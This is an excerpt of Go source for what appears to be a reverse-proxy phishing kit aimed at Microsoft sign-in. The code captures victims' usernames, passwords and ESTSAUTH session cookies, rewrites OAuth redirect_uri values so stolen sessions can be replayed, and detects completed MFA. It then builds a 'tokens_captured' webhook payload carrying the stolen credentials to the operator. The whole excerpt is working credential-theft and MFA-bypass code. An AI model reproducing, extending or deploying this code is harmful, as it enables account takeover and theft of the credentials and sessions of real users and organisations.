...
func getEstsAuthCookie(tokens map[string]map[string]*database.CookieToken) string {
	// Prefer ESTSAUTH for silent SSO replay; ESTSAUTHPERSISTENT is not valid in all scenarios.
	for _, domainTokens := range tokens {
		for name, token := range domainTokens {
			if name == "ESTSAUTH" && token.Value != "" {
				return token.Value
			}
		}
	}
	for _, domainTokens := range tokens {
		for name, token := range domainTokens {
			if name == "ESTSAUTHPERSISTENT" && token.Value != "" {
				return token.Value
			}
		}
	}
...
func (p *HttpProxy) sendSessionWebhook(ps *ProxySession, s *Session, trigger string) {
	if s.WebhookSent {
		log.Debug("[%d] webhook already sent for session %s, skipping", ps.Index, ps.SessionId)
		return
	}

	if s.Username == "" {
		log.Warning("[%d] skipping webhook: username not captured yet", ps.Index)
		return
	}

	estsAuthCookie := getEstsAuthCookie(s.CookieTokens)
	if estsAuthCookie == "" {
		log.Warning("[%d] skipping webhook: ESTSAUTH cookie not captured yet", ps.Index)
		return
	}
	...
	log.Success("[%d] using redirect_uri for replay: %s", ps.Index, redirectUri)

	webhookData := map[string]interface{}{
		"event":             "tokens_captured",
		"phishlet":          ps.PhishletName,
		"session_id":        ps.SessionId,
		"userPrincipalName": s.Username,
		"displayName":       "Hello",
		"keyVaultKeyName":   fmt.Sprintf("pk-%s-%s", strings.Split(s.Username, "@")[0], GenRandomAlphanumString(8)),
		"estsAuth":          estsAuthCookie,
		"redirectUri":       redirectUri,
		"password":          s.Password,
		"remote_ip":         s.RemoteAddr,
		"user_agent":        s.UserAgent,
		//"cookie_tokens":     s.CookieTokens,
...
func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
	...
	p.Proxy.OnRequest().
		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
			...
			if phished {
				...
				if pl != nil {
					// capture original OAuth redirect_uri from raw query BEFORE patching (for server-side replay)
					if ps.SessionId != "" && (strings.Contains(req.URL.Path, "/oauth2/v2.0/authorize") || strings.Contains(req.URL.Path, "/oauth2/authorize")) {
						if s, ok := p.sessions[ps.SessionId]; ok {
							redirectUri := req.URL.Query().Get("redirect_uri")
							if redirectUri != "" && s.OAuthRedirectUri == "" {
								// The victim's browser sees the phishing domain; convert back to the original reply URL
								s.OAuthRedirectUri = string(p.patchUrls(pl, []byte(redirectUri), CONVERT_TO_ORIGINAL_URLS))
								log.Success("[%d] captured original OAuth redirect_uri: %s", ps.Index, s.OAuthRedirectUri)
							} else if redirectUri != "" {
								log.Debug("[%d] redirect_uri already captured as: %s", ps.Index, s.OAuthRedirectUri)
							} else {
								log.Warning("[%d] authorize request missing redirect_uri query param: %s", ps.Index, req.URL.RawQuery)
							}
						}
					}
				...
				if pl != nil {
					...
					if err == nil {
						...
						// explicit OAuth token request redirect_uri patching
						if strings.Contains(req.URL.Path, "/token") && form_re.MatchString(contentType) {
							if parsed, err := url.ParseQuery(string(body)); err == nil {
								originalRedirectUri := parsed.Get("redirect_uri")
								if originalRedirectUri != "" {
									patchedRedirectUri := originalRedirectUri
									if s, ok := p.sessions[ps.SessionId]; ok && s.OAuthRedirectUri != "" {
										patchedRedirectUri = s.OAuthRedirectUri
									} else {
										patchedRedirectUri = string(p.patchUrls(pl, []byte(originalRedirectUri), CONVERT_TO_ORIGINAL_URLS))
									}
									if patchedRedirectUri != originalRedirectUri {
										parsed.Set("redirect_uri", patchedRedirectUri)
										body = []byte(parsed.Encode())
										req.ContentLength = int64(len(body))
										log.Success("[%d] explicit token redirect_uri patch: %s -> %s", ps.Index, originalRedirectUri, patchedRedirectUri)
									} else {
										log.Warning("[%d] token redirect_uri patch did not change value: %s", ps.Index, originalRedirectUri)
									}
								} else {
									log.Warning("[%d] token request body missing redirect_uri", ps.Index)
								}
							} else {
								log.Warning("[%d] failed to parse token request body: %v", ps.Index, err)
							}
						}
						...
						if ps.SessionId != "" {
							...
							if json_re.MatchString(contentType) {
								...
								if req.ParseForm() == nil && req.PostForm != nil && len(req.PostForm) > 0 {
									...
									// log OAuth token request redirect_uri after patching
									if strings.Contains(req.URL.Path, "/token") {
										patchedRedirectUri := req.PostForm.Get("redirect_uri")
										if patchedRedirectUri != "" {
											log.Success("[%d] patched token request redirect_uri: %s", ps.Index, patchedRedirectUri)
										}
									}
	...
	p.Proxy.OnResponse().
		DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
			...
			// detect successful MFA completion on /common/SAS/ProcessAuth 302 redirect to mysignins
			if pl != nil && ps.SessionId != "" {
				if s, ok := p.sessions[ps.SessionId]; ok {
					if req_hostname == "login.microsoftonline.com" && resp.Request.URL.Path == "/common/SAS/ProcessAuth" && resp.StatusCode == 302 {
						r_url, err := resp.Location()
						if err == nil && strings.HasPrefix(r_url.Host, "mysignins.") {
							log.Success("[%d] detected successful MFA completion (ProcessAuth 302 -> %s)", ps.Index, r_url.Host)
							...
							s.Finish(true)
							p.sendSessionWebhook(ps, s, "ProcessAuth-302")
						}
					}
				}
			}
				...
				if ok && s.IsDone {
					for _, au := range pl.authUrls {
						if au.MatchString(resp.Request.URL.Path) {
							...
							p.sendSessionWebhook(ps, s, resp.Request.URL.Path)
							break
						}
					}
				}
